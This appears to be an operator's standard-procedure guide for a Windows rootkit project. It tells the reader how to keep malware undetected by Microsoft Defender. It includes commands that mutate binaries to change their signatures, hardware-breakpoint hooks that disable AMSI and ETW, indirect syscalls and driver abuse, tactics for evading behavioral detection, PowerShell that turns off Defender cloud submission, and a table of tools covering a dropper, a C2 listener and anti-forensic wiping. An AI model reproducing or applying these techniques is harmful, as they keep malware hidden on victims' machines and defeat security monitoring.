# BATTLE DRILL — DEFENDER ADAPTATION SOP

When you come back cold and Defender catches something, follow this.
No thinking required. Just match the scenario and execute.

---

## SCENARIO 1: Static Signature Catches Binary

**Symptom:** `build_cloak.py --scan` says `DETECTED` instead of `CLEAN`

**What happened:** Microsoft added your binary's byte pattern to signature DB.

**Fix:**
```bash
cd vader-rootkit
python mutate.py --rotate-keys
python cloak/build_cloak.py --scan
```

New XOR keys = every byte shifts. New signature. 30 seconds. Infinite variants.
Still detected? Rotate again. They signature BYTES, not STRUCTURE.

---

## SCENARIO 2: AMSI Blocks Script at Runtime

**Symptom:** PowerShell says "This script contains malicious content"

**What happened:** New AMSI scan pattern added.

**Fix:** Dark Room handles this automatically. HWBP on AmsiScanBuffer returns
E_INVALIDARG (0x80070057) before AMSI ever scans. They can add a million
patterns — the function never executes.

**If it still blocks:** Dark Room isn't running. Start it first.
Check DR0 is set on AmsiScanBuffer with GetThreadContext.

**Why this always works:** CPU debug registers. VULN-195458. MSRC won't fix.
They'd have to break every debugger on the planet.

---

## SCENARIO 3: ETW Telemetry Flags Behavior

**Symptom:** Defender responds to actions that should be invisible.

**What happened:** New ETW event channel or provider.

**Fix:** DR1 on EtwEventWrite. All events return 0 (success) but write nothing.
New channels still flow through EtwEventWrite — one hook catches them all.

**Exception:** Kernel-level ETW-Ti (Threat Intelligence). That's a kernel callback,
not user-mode ETW. Defender Home doesn't use it — enterprise EDR does
(CrowdStrike, SentinelOne). If you hit this wall:
- SithStalker indirect syscalls (bypass user-mode hooks entirely)
- BYOVD driver for kernel access (Phase 8 in the plan)

---

## SCENARIO 4: Behavioral Heuristic Kills Process

**Symptom:** Binary scans CLEAN but Defender kills it during execution.

**What happened:** ML model flagged the sequence of API calls.

**This is the only scenario that requires thinking.** Options:

1. **Add timing jitter** — `Sleep(rand() % 3000 + 1000)` between suspicious API calls.
   Breaks behavioral correlation windows.

2. **Reorder operations** — change the sequence APIs are called in.
   ML models are trained on specific call sequences.

3. **Split across processes** — one process does persistence, another does C2,
   third does recon. No single process has the full suspicious profile.

4. **Indirect syscalls** — SithStalker gate engine. Skip ntdll entirely.
   Go straight to kernel via syscall instruction. Defender's user-mode
   hooks see nothing because you never call the hooked functions.

5. **Modify API resolution** — change which DLLs you load from, use
   different function names that do the same thing, or chain through
   legitimate Windows APIs that internally call what you need.

---

## SCENARIO 5: Cloud Submission Flags Sample

**Symptom:** Local scan passes but cloud verdict comes back dirty.

**What happened:** Defender uploaded your binary to Microsoft cloud for deep analysis.

**Fix:**
```powershell
# Disable cloud submission on test machine
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
```

mutate.py makes every build unique. Cloud signatures are per-sample.
They don't transfer to the next mutation.

---

## QUICK DECISION TREE

```
SOMETHING GOT DETECTED
│
├── When? ──┬── On disk (before execution)?
│           │   └── SCENARIO 1: Rotate keys, rebuild, rescan
│           │
│           └── During execution?
│               ├── AMSI error message? → SCENARIO 2: Check Dark Room
│               ├── Process killed silently? → SCENARIO 4: Jitter/split/syscalls
│               └── Actions visible to admin? → SCENARIO 3: Check ETW hook
│
└── Cloud verdict came back late?
    └── SCENARIO 5: Disable cloud, rotate, rebuild
```

---

## THE METHODOLOGY (when none of the above works)

From 0x1security:

1. **Search for knowledge, not bugs.** Understand WHY Defender caught it.
2. **See the path.** What was the detection vector? Signature? Behavior? Heuristic?
3. **See the block.** What specific check identified you?
4. **Find the substitute.** Same outcome, different technique.
5. **Crash → Leak → Execute.** Make the security product fail, extract what it knows, act on it.

The specific exploit changes. The methodology doesn't.

---

## TOOLS REFERENCE

| Tool | Command | What It Does |
|------|---------|-------------|
| Rotate signatures | `python mutate.py --rotate-keys` | New XOR keys, unique binary |
| Build + scan | `python cloak/build_cloak.py --scan` | Compile all, Defender check |
| Dark Room | Built into vader_dropper.exe | HWBP AMSI/ETW bypass |
| Ghost encode | `python ghost_encode.py --vader` | Zero-width file-layer protection |
| Recon scanner | `powershell -ep bypass -File vader_recon.ps1` | Map Defender's current config |
| Cleanup | `vader_clean.exe` | Anti-forensics, 5-phase wipe |
| C2 listener | `python cloak/c2_listen.py 53682` | Receive dropper connections |
| Gate engine | sith-stalker/src/gate_v2.c | Indirect syscalls (bypass hooks) |

---

## REMEMBER

- Dark Room is architecturally permanent (VULN-195458, MSRC won't fix)
- Ghost encoding has no signatures to match (zero-width Unicode)
- mutate.py gives you infinite unique variants
- The cloak hides from user-mode queries (Task Manager, dir, netstat)
- Only kernel-level EDR (enterprise) sees through the stack
- Defender Home is the target. You own it. Completely.

---

*22DIV / VADER / george wu*
*"Four walls, four doors — each one already keyed."*
